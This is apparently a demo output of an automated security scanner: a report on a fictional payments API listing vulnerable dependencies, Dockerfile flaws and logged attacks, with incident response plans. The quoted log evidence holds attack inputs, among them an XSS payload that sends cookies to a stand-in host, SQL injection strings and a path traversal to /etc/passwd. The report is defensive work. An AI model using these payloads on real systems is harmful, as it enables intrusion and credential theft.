# CyberGuard Scan Report - `sample-scan`

- **Target:** acme-payments-api (demo)
- **Started:** 2026-09-05T16:02:59+00:00  •  **Finished:** 2026-09-05T16:02:59+00:00
- **Findings:** 17 (critical 3, high 12, medium 1, low 1, info 0)
- **Incident plans:** 11
- **Compliance:** NIST Cybersecurity Framework 2.0 - coverage 66.7% - 8 failing/partial

> All remediation below is **proposed only**. No state-changing action was executed.

## Executive summary

This scan produced 17 findings (3 critical, 12 high, 1 medium, 1 low, 0 info). 11 incident response plan(s) were generated for confirmed or high-confidence issues.

Highest-priority items:
  - [critical] CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)
  - [critical] Vulnerable dependency: pyyaml==5.3.1 (CVE-2020-14343)
  - [critical] Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)
  - [high] Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)
  - [high] XSS probe: 1 request(s) from 198.51.100.23

Compliance: mapped against NIST_CSF; estimated control coverage 67% with 8 control(s) currently failing or partial. All remediation is proposed only - no state-changing action was executed. Human review is required before acting on any plan step flagged for approval.

## Agent status

| Agent | Status |
| --- | --- |
| log_monitor | ok |
| vuln_scanner | partial |
| threat_intel | ok |
| incident_response | ok |
| policy_checker | ok |

## Findings

### [CRIT] CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)

- **id:** `F-ce3694347c63`  •  **agent:** threat_intel  •  **severity:** critical  •  **confidence:** 0.95
- **category:** CVE-2020-14343  •  **target:** `pyyaml (all affected locations)`
- **correlated with:** `F-c3b8551319dc`
- CVE-2020-14343 affects pyyaml <5.4. CVSS 9.8. Fixed in 5.4. A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.
- **evidence:**
  - `Derived from finding F-c3b8551319dc (Vulnerable dependency: pyyaml==5.3.1 (CVE-2020-14343))`
- **recommended fix:** Upgrade pyyaml to >= 5.4 and redeploy.
- **refs:** https://nvd.nist.gov/vuln/detail/CVE-2020-14343, https://github.com/yaml/pyyaml/issues/420

### [CRIT] Vulnerable dependency: pyyaml==5.3.1 (CVE-2020-14343)

- **id:** `F-c3b8551319dc`  •  **agent:** vuln_scanner  •  **severity:** critical  •  **confidence:** 0.90
- **category:** CVE-2020-14343  •  **target:** `requirements.txt:3`
- **correlated with:** `F-ce3694347c63`
- A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.
- **evidence:**
  - `requirements.txt:3: PyYAML==5.3.1`
- **threat intel CVE-2020-14343:** affected=yes cvss=9.8 epss=0.9 kev=False fixed=5.4
- **threat intel CVE-2020-1747:** affected=uncertain cvss=None epss=None kev=None fixed=None
- **recommended fix:** Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).
- **refs:** https://nvd.nist.gov/vuln/detail/CVE-2020-14343, https://github.com/yaml/pyyaml/issues/420

### [CRIT] Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)

- **id:** `F-4d73c8cbff46`  •  **agent:** vuln_scanner  •  **severity:** critical  •  **confidence:** 0.80
- **category:** CVE-2019-10906  •  **target:** `requirements.txt:4`
- Jinja2 sandbox escape via str.format_map, allowing an attacker who controls a template to break out of the sandbox.
- **evidence:**
  - `requirements.txt:4: Jinja2==2.10`
- **threat intel CVE-2019-10906:** affected=yes cvss=9.8 epss=0.12 kev=False fixed=2.10.1
- **recommended fix:** Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).
- **refs:** https://nvd.nist.gov/vuln/detail/CVE-2019-10906

### [HIGH] Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)

- **id:** `F-4dde57b4f8be`  •  **agent:** log_monitor  •  **severity:** high  •  **confidence:** 1.00
- **category:** ATT&CK T1110.001  •  **target:** `demo/env/var/log/auth.log`
- **correlated with:** `F-f3be33a4a8b1`, `F-83069228f1b0`
- 8 failed authentication events from 203.0.113.66 between Sep  6 01:12:03 .. Sep  6 01:12:21. No successful login from this IP was observed.
- **evidence:**
  - `Sep  6 01:12:03 pay-api-1 sshd[20441]: Failed password for invalid user admin from 203.0.113.66 port 51422 ssh2`
  - `Sep  6 01:12:05 pay-api-1 sshd[20443]: Failed password for invalid user admin from 203.0.113.66 port 51488 ssh2`
  - `Sep  6 01:12:07 pay-api-1 sshd[20445]: Failed password for root from 203.0.113.66 port 51590 ssh2`
  - `Sep  6 01:12:09 pay-api-1 sshd[20447]: Failed password for root from 203.0.113.66 port 51640 ssh2`
  - `Sep  6 01:12:12 pay-api-1 sshd[20449]: Failed password for invalid user deploy from 203.0.113.66 port 51701 ssh2`
  - `Sep  6 01:12:15 pay-api-1 sshd[20451]: Failed password for invalid user deploy from 203.0.113.66 port 51777 ssh2`
- **IOC 203.0.113.66:** brute-force / credential-stuffing source (campaign sample-cred-stuffing-2026)
- **recommended fix:** Block the source IP at the edge, lock/reset the targeted account(s), enforce MFA, and deploy rate-limiting / fail2ban on the auth service.
- **refs:** https://attack.mitre.org/techniques/T1110/

### [HIGH] XSS probe: 1 request(s) from 198.51.100.23

- **id:** `F-8bd7e433f512`  •  **agent:** log_monitor  •  **severity:** high  •  **confidence:** 0.95
- **category:** OWASP-A03 / ATT&CK T1190  •  **target:** `demo/env/var/log/nginx/access.log`
- **correlated with:** `F-4c70da6fa645`, `F-3c0e8bd0a3a2`, `F-c87d3959274e`
- 1 HTTP request(s) matched the 'XSS probe' signature. At least one received a non-error (<400) response - possible successful exploitation, investigate.
- **evidence:**
  - `198.51.100.23 - - [06/Sep/2026:01:31:02 +0000] "GET /search?q=<script>document.location='http://evil.example/c?'+document.cookie</script> HTTP/1.1" 200 1990 "-" "Mozilla/5.0"`
- **IOC 198.51.100.23:** web application scanning (sqlmap-style probes) (campaign sample-web-scan-2026)
- **recommended fix:** Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.
- **refs:** https://attack.mitre.org/techniques/T1190/

### [HIGH] Traffic involves known-malicious IP 203.0.113.66 (brute-force / credential-stuffing source)

- **id:** `F-83069228f1b0`  •  **agent:** threat_intel  •  **severity:** high  •  **confidence:** 0.90
- **category:** ATT&CK T1595 / IOC  •  **target:** `203.0.113.66`
- **correlated with:** `F-4dde57b4f8be`, `F-f3be33a4a8b1`
- 203.0.113.66 appears in threat intelligence as brute-force / credential-stuffing source (campaign sample-cred-stuffing-2026, first seen 2026-08-20). It is referenced by finding F-4dde57b4f8be.
- **evidence:**
  - `Derived from finding F-4dde57b4f8be (Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts))`
  - `Derived from finding F-f3be33a4a8b1 (Path traversal / LFI probe: 1 request(s) from 203.0.113.66)`
- **recommended fix:** Block 203.0.113.66 at the perimeter and hunt for other activity from it.
- **refs:** sample-data

### [HIGH] SQL injection probe: 2 request(s) from 198.51.100.23

- **id:** `F-4c70da6fa645`  •  **agent:** log_monitor  •  **severity:** high  •  **confidence:** 0.80
- **category:** OWASP-A03 / ATT&CK T1190  •  **target:** `demo/env/var/log/nginx/access.log`
- **correlated with:** `F-3c0e8bd0a3a2`, `F-8bd7e433f512`, `F-c87d3959274e`
- **severity adjusted:** medium -> high (source/destination IP 198.51.100.23 matches threat intelligence)
- 2 HTTP request(s) matched the 'SQL injection probe' signature. All matched requests received error responses.
- **evidence:**
  - `198.51.100.23 - - [06/Sep/2026:01:30:11 +0000] "GET /api/v1/items?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"`
  - `198.51.100.23 - - [06/Sep/2026:01:30:15 +0000] "GET /api/v1/items?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"`
- **IOC 198.51.100.23:** web application scanning (sqlmap-style probes) (campaign sample-web-scan-2026)
- **recommended fix:** Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.
- **refs:** https://attack.mitre.org/techniques/T1190/

### [HIGH] Known scanner user-agent: 3 request(s) from 198.51.100.23

- **id:** `F-3c0e8bd0a3a2`  •  **agent:** log_monitor  •  **severity:** high  •  **confidence:** 0.80
- **category:** ATT&CK T1595  •  **target:** `demo/env/var/log/nginx/access.log`
- **correlated with:** `F-4c70da6fa645`, `F-8bd7e433f512`, `F-c87d3959274e`
- **severity adjusted:** medium -> high (source/destination IP 198.51.100.23 matches threat intelligence)
- 3 HTTP request(s) matched the 'Known scanner user-agent' signature. Reconnaissance tooling - not an exploit attempt on its own, but expect follow-up.
- **evidence:**
  - `198.51.100.23 - - [06/Sep/2026:01:30:11 +0000] "GET /api/v1/items?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"`
  - `198.51.100.23 - - [06/Sep/2026:01:30:13 +0000] "GET /api/v1/items?id=1%20OR%201=1 HTTP/1.1" 200 4021 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"`
  - `198.51.100.23 - - [06/Sep/2026:01:30:15 +0000] "GET /api/v1/items?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"`
- **IOC 198.51.100.23:** web application scanning (sqlmap-style probes) (campaign sample-web-scan-2026)
- **recommended fix:** Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.
- **refs:** https://attack.mitre.org/techniques/T1190/

### [HIGH] Path traversal / LFI probe: 1 request(s) from 203.0.113.66

- **id:** `F-f3be33a4a8b1`  •  **agent:** log_monitor  •  **severity:** high  •  **confidence:** 0.80
- **category:** OWASP-A01 / ATT&CK T1190  •  **target:** `demo/env/var/log/nginx/access.log`
- **correlated with:** `F-4dde57b4f8be`, `F-83069228f1b0`
- **severity adjusted:** medium -> high (source/destination IP 203.0.113.66 matches threat intelligence)
- 1 HTTP request(s) matched the 'Path traversal / LFI probe' signature. All matched requests received error responses.
- **evidence:**
  - `203.0.113.66 - - [06/Sep/2026:01:33:41 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 179 "-" "curl/8.2.1"`
- **IOC 203.0.113.66:** brute-force / credential-stuffing source (campaign sample-cred-stuffing-2026)
- **recommended fix:** Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.
- **refs:** https://attack.mitre.org/techniques/T1190/

### [HIGH] Traffic involves known-malicious IP 198.51.100.23 (web application scanning (sqlmap-style probes))

- **id:** `F-c87d3959274e`  •  **agent:** threat_intel  •  **severity:** high  •  **confidence:** 0.80
- **category:** ATT&CK T1595 / IOC  •  **target:** `198.51.100.23`
- **correlated with:** `F-4c70da6fa645`, `F-3c0e8bd0a3a2`, `F-8bd7e433f512`
- 198.51.100.23 appears in threat intelligence as web application scanning (sqlmap-style probes) (campaign sample-web-scan-2026, first seen 2026-08-28). It is referenced by finding F-4c70da6fa645.
- **evidence:**
  - `Derived from finding F-4c70da6fa645 (SQL injection probe: 2 request(s) from 198.51.100.23)`
  - `Derived from finding F-3c0e8bd0a3a2 (Known scanner user-agent: 3 request(s) from 198.51.100.23)`
  - `Derived from finding F-8bd7e433f512 (XSS probe: 1 request(s) from 198.51.100.23)`
- **recommended fix:** Block 198.51.100.23 at the perimeter and hunt for other activity from it.
- **refs:** sample-data

### [HIGH] Unpinned base image (`:latest` or no tag) in Dockerfile:2

- **id:** `F-baff40d64173`  •  **agent:** vuln_scanner  •  **severity:** high  •  **confidence:** 0.75
- **category:** CWE-1188  •  **target:** `demo/env/app/Dockerfile:2`
- **severity adjusted:** medium -> high (context: exploit maturity / external exposure / asset criticality / confidence)
- Unpinned base image (`:latest` or no tag)
- **evidence:**
  - `Dockerfile:2: FROM python:latest`
- **recommended fix:** Pin the base image to an immutable digest (FROM image@sha256:...).
- **refs:** https://cwe.mitre.org/data/definitions/1188.html

### [HIGH] ADD used to fetch a remote URL in Dockerfile:8

- **id:** `F-7fc2198b44a0`  •  **agent:** vuln_scanner  •  **severity:** high  •  **confidence:** 0.75
- **category:** CWE-494  •  **target:** `demo/env/app/Dockerfile:8`
- **severity adjusted:** medium -> high (context: exploit maturity / external exposure / asset criticality / confidence)
- ADD used to fetch a remote URL
- **evidence:**
  - `Dockerfile:8: ADD https://example.com/bootstrap/install.sh /tmp/install.sh`
- **recommended fix:** Use COPY for local files; download with verified checksums in a RUN step.
- **refs:** https://cwe.mitre.org/data/definitions/494.html

### [HIGH] Container runs as root (no non-root USER instruction) in Dockerfile:17

- **id:** `F-976af72625aa`  •  **agent:** vuln_scanner  •  **severity:** high  •  **confidence:** 0.75
- **category:** CWE-250  •  **target:** `demo/env/app/Dockerfile:17`
- Container runs as root (no non-root USER instruction)
- **evidence:**
  - `Dockerfile:17: (no USER instruction)`
- **recommended fix:** Add a non-root `USER` instruction and make required paths writable by that UID.
- **refs:** https://cwe.mitre.org/data/definitions/250.html

### [HIGH] Privilege-escalation attempts via sudo (2 event(s))

- **id:** `F-f1c73039b1c6`  •  **agent:** log_monitor  •  **severity:** high  •  **confidence:** 0.60
- **category:** ATT&CK T1548.003  •  **target:** `demo/env/var/log/auth.log`
- **severity adjusted:** medium -> high (context: exploit maturity / external exposure / asset criticality / confidence)
- Repeated sudo authentication failures or use by a user not in sudoers.
- **evidence:**
  - `Sep  6 01:14:44 pay-api-1 sudo[20512]: alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash`
  - `Sep  6 01:15:01 pay-api-1 sudo[20520]: bob : user NOT in the sudoers file ; TTY=pts/1 ; PWD=/srv ; USER=root ; COMMAND=/usr/bin/id`
- **recommended fix:** Review sudoers, alert on repeated failures, and confirm the account owner.
- **refs:** https://attack.mitre.org/techniques/T1548/003/

### [HIGH] Hardcoded secret (aws_access_key_id) in settings.py:4

- **id:** `F-014c834cd5cd`  •  **agent:** vuln_scanner  •  **severity:** high  •  **confidence:** 0.60
- **category:** CWE-798  •  **target:** `settings.py:4`
- A credential-like string is committed to the repository.
- **evidence:**
  - `settings.py:4: AWS_ACCESS_KEY_ID = "[REDACTED:aws-akid]"`
- **recommended fix:** Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.
- **refs:** https://cwe.mitre.org/data/definitions/798.html

### [MED ] apt-get install without cleaning apt lists in Dockerfile:9

- **id:** `F-e43293fc771f`  •  **agent:** vuln_scanner  •  **severity:** medium  •  **confidence:** 0.75
- **category:** CWE-1188  •  **target:** `demo/env/app/Dockerfile:9`
- **severity adjusted:** low -> medium (context: exploit maturity / external exposure / asset criticality / confidence)
- apt-get install without cleaning apt lists
- **evidence:**
  - `Dockerfile:9: RUN apt-get update && apt-get install -y curl build-essential`
- **recommended fix:** Append `&& rm -rf /var/lib/apt/lists/*` to shrink layers and attack surface.
- **refs:** https://cwe.mitre.org/data/definitions/1188.html

### [LOW ] API active testing skipped (no --allow-active / not on allowlist)

- **id:** `F-817e9ba6560b`  •  **agent:** vuln_scanner  •  **severity:** low  •  **confidence:** 0.95
- **category:** coverage-gap  •  **target:** `https://api.acme.example/v1/pay`
- **severity adjusted:** info -> low (context: exploit maturity / external exposure / asset criticality / confidence)
- 1 endpoint(s) provided. Active testing requires target.allow_active=true and each host present in target.allowlist.
- **recommended fix:** Re-run with allow_active and an explicit allowlist to enable API checks.

## Incident response plans

### IR plan: CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)

- **priority:** P1  •  **SLA:** Begin containment within 1 hour
- **findings:** `F-c3b8551319dc`, `F-ce3694347c63`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: pyyaml (all affected locations), requirements.txt:3", "data_at_risk": "Depends on the vulnerable component's role; assume code/data on the host", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** App team, AppSec, Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation - owner: AppSec _(needs human approval)_
     - change: `Add mitigating WAF rule or disable the vulnerable feature/route`
     - rollback: Remove mitigation after upgrade
     - verify: Exploit path blocked or unreachable
  2. **[eradicate]** Upgrade the affected package to the fixed version and rebuild artifacts/images - owner: App team _(needs human approval)_
     - change: `Bump the pinned version to >= fixed release; rebuild and re-scan`
     - rollback: Pin back to previous version
     - verify: Scanner reports the CVE resolved
  3. **[recover]** Deploy the rebuilt service and run regression + smoke tests - owner: App team _(needs human approval)_
     - rollback: Roll back to previous build
     - verify: Service healthy; version confirmed in runtime
  4. **[post-incident]** Enable automated dependency updates (Dependabot/Renovate) and SCA in CI - owner: Platform _(needs human approval)_
     - verify: New advisories open PRs automatically; CI fails on known-vuln deps

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)
Priority: P1   SLA: Begin containment within 1 hour
Affected: pyyaml (all affected locations)
Detected by: threat_intel at 2026-09-05T16:02:59+00:00

What we know: CVE-2020-14343 affects pyyaml <5.4. CVSS 9.8. Fixed in 5.4. A vulnerability in PyYAML allows arbitrary code execution when untrusted YAML is processed with FullLoader / yaml.full_load, via crafted python/object/new tags. Incomplete fix for CVE-2020-1747.
Immediate actions proposed: Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)

- **priority:** P1  •  **SLA:** Begin containment within 1 hour
- **findings:** `F-4d73c8cbff46`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: requirements.txt:4", "data_at_risk": "Depends on the vulnerable component's role; assume code/data on the host", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** App team, AppSec, Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation - owner: AppSec _(needs human approval)_
     - change: `Add mitigating WAF rule or disable the vulnerable feature/route`
     - rollback: Remove mitigation after upgrade
     - verify: Exploit path blocked or unreachable
  2. **[eradicate]** Upgrade the affected package to the fixed version and rebuild artifacts/images - owner: App team _(needs human approval)_
     - change: `Bump the pinned version to >= fixed release; rebuild and re-scan`
     - rollback: Pin back to previous version
     - verify: Scanner reports the CVE resolved
  3. **[recover]** Deploy the rebuilt service and run regression + smoke tests - owner: App team _(needs human approval)_
     - rollback: Roll back to previous build
     - verify: Service healthy; version confirmed in runtime
  4. **[post-incident]** Enable automated dependency updates (Dependabot/Renovate) and SCA in CI - owner: Platform _(needs human approval)_
     - verify: New advisories open PRs automatically; CI fails on known-vuln deps

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)
Priority: P1   SLA: Begin containment within 1 hour
Affected: requirements.txt:4
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: Jinja2 sandbox escape via str.format_map, allowing an attacker who controls a template to break out of the sandbox.
Immediate actions proposed: Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-4dde57b4f8be`, `F-83069228f1b0`, `F-f3be33a4a8b1`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: 203.0.113.66, demo/env/var/log/auth.log, demo/env/var/log/nginx/access.log", "data_at_risk": "Credentials and anything they authorize", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** IAM, IAM / SOC, Network / SecOps, Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Block the offending source IP(s) at the edge / WAF - owner: Network / SecOps _(needs human approval)_
     - change: `Add deny rule for the source IP(s) on the perimeter firewall or WAF`
     - rollback: Remove the deny rule once the campaign subsides
     - verify: No further auth attempts from the IP in logs
  2. **[contain]** Lock or force-reset the targeted account(s) and revoke active sessions - owner: IAM _(needs human approval)_
     - change: `Disable account / expire password / revoke tokens & sessions`
     - rollback: Re-enable after owner verification
     - verify: Owner confirms control; no unexpected sessions remain
  3. **[eradicate]** Rotate credentials for any account with a successful login after failures - owner: IAM _(needs human approval)_
     - change: `Reset password + rotate API keys / tokens for the account`
     - verify: Old credentials rejected; new ones issued to verified owner
  4. **[eradicate]** Review auth logs for successful logins from the source and for lateral movement - owner: SOC
     - verify: Analyst sign-off that scope is understood
  5. **[recover]** Restore normal access for verified users; keep heightened monitoring 7 days - owner: IAM / SOC _(needs human approval)_
     - verify: Users can log in; alerting tuned
  6. **[post-incident]** Enforce MFA, tune lockout thresholds, deploy fail2ban/rate-limiting, add a detection rule - owner: Platform _(needs human approval)_
     - verify: Controls deployed and tested

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)
Priority: P2   SLA: Begin containment within 4 hours
Affected: demo/env/var/log/auth.log
Detected by: log_monitor at 2026-09-05T16:02:59+00:00

What we know: 8 failed authentication events from 203.0.113.66 between Sep  6 01:12:03 .. Sep  6 01:12:21. No successful login from this IP was observed.
Immediate actions proposed: Block the offending source IP(s) at the edge / WAF

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: XSS probe: 1 request(s) from 198.51.100.23

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-3c0e8bd0a3a2`, `F-4c70da6fa645`, `F-8bd7e433f512`, `F-c87d3959274e`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: 198.51.100.23, demo/env/var/log/nginx/access.log", "data_at_risk": "Application database contents (potential read/modify)", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** App team, AppSec, AppSec / Network
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Deploy/verify a WAF rule for the payload class and rate-limit the source - owner: AppSec / Network _(needs human approval)_
     - change: `Enable managed WAF ruleset (e.g. OWASP CRS) for the affected route`
     - rollback: Loosen rule if false positives appear
     - verify: Malicious requests blocked; legitimate traffic unaffected
  2. **[eradicate]** Patch the underlying injection/traversal flaw in the endpoint - owner: App team _(needs human approval)_
     - change: `Parameterize queries / validate & canonicalize input / apply output encoding`
     - rollback: Revert the deploy
     - verify: Exploit request no longer succeeds in a test
  3. **[eradicate]** Review app and DB logs for successful exploitation and data access - owner: SOC / DBA
     - verify: Analyst sign-off on impact scope
  4. **[recover]** Redeploy the patched service and confirm functionality - owner: App team _(needs human approval)_
     - rollback: Roll back to previous known-good build
     - verify: Regression tests pass; endpoint healthy
  5. **[post-incident]** Add SAST/DAST gates to CI and a regression test for this payload - owner: AppSec _(needs human approval)_
     - verify: CI blocks a reintroduction of the flaw

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: XSS probe: 1 request(s) from 198.51.100.23
Priority: P2   SLA: Begin containment within 4 hours
Affected: demo/env/var/log/nginx/access.log
Detected by: log_monitor at 2026-09-05T16:02:59+00:00

What we know: 1 HTTP request(s) matched the 'XSS probe' signature. At least one received a non-error (<400) response - possible successful exploitation, investigate.
Immediate actions proposed: Deploy/verify a WAF rule for the payload class and rate-limit the source

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: Unpinned base image (`:latest` or no tag) in Dockerfile:2

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-baff40d64173`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:2", "data_at_risk": "Undetermined - confirm during analysis", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Assess whether affected containers are running in production; restrict exposure - owner: Platform _(needs human approval)_
     - change: `Apply network policy / scale down non-essential exposure`
     - rollback: Restore exposure after fix
     - verify: Blast radius reduced and documented
  2. **[eradicate]** Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild - owner: Platform _(needs human approval)_
     - change: `Edit Dockerfile; rebuild; re-scan the image`
     - rollback: Redeploy previous image
     - verify: Re-scan shows the misconfiguration resolved
  3. **[recover]** Roll the hardened image out across environments - owner: Platform _(needs human approval)_
     - rollback: Roll back to previous image
     - verify: All workloads on the hardened image; healthy
  4. **[post-incident]** Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root) - owner: Platform _(needs human approval)_
     - verify: CI and admission controller reject non-compliant images

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: Unpinned base image (`:latest` or no tag) in Dockerfile:2
Priority: P2   SLA: Begin containment within 4 hours
Affected: demo/env/app/Dockerfile:2
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: Unpinned base image (`:latest` or no tag)
Immediate actions proposed: Assess whether affected containers are running in production; restrict exposure

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: ADD used to fetch a remote URL in Dockerfile:8

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-7fc2198b44a0`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
- **impact:** {"asset_criticality": "high", "exposure": "external", "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:8", "data_at_risk": "Undetermined - confirm during analysis", "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).", "actively_exploited": false}
- **required approvals:** Platform
- **evidence preservation:**
  - Snapshot affected host(s) / container(s) before making changes.
  - Export the relevant raw logs to write-once storage and record SHA-256 hashes.
  - Capture volatile state (process list, network connections) if a host may be compromised.
  - Record a timeline: who did what, when, in the incident ticket.
- **steps:**
  1. **[contain]** Assess whether affected containers are running in production; restrict exposure - owner: Platform _(needs human approval)_
     - change: `Apply network policy / scale down non-essential exposure`
     - rollback: Restore exposure after fix
     - verify: Blast radius reduced and documented
  2. **[eradicate]** Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild - owner: Platform _(needs human approval)_
     - change: `Edit Dockerfile; rebuild; re-scan the image`
     - rollback: Redeploy previous image
     - verify: Re-scan shows the misconfiguration resolved
  3. **[recover]** Roll the hardened image out across environments - owner: Platform _(needs human approval)_
     - rollback: Roll back to previous image
     - verify: All workloads on the hardened image; healthy
  4. **[post-incident]** Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root) - owner: Platform _(needs human approval)_
     - verify: CI and admission controller reject non-compliant images

<details><summary>Comms draft</summary>

```
SECURITY NOTIFICATION (INTERNAL - DRAFT)

Summary: ADD used to fetch a remote URL in Dockerfile:8
Priority: P2   SLA: Begin containment within 4 hours
Affected: demo/env/app/Dockerfile:8
Detected by: vuln_scanner at 2026-09-05T16:02:59+00:00

What we know: ADD used to fetch a remote URL
Immediate actions proposed: Assess whether affected containers are running in production; restrict exposure

This is an automated draft. Confirm details and obtain approval before
executing any containment or eradication step.
```

</details>

### IR plan: Container runs as root (no non-root USER instruction) in Dockerfile:17

- **priority:** P2  •  **SLA:** Begin containment within 4 hours
- **findings:** `F-976af72625aa`
- **NIST SP 800-61:** Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity
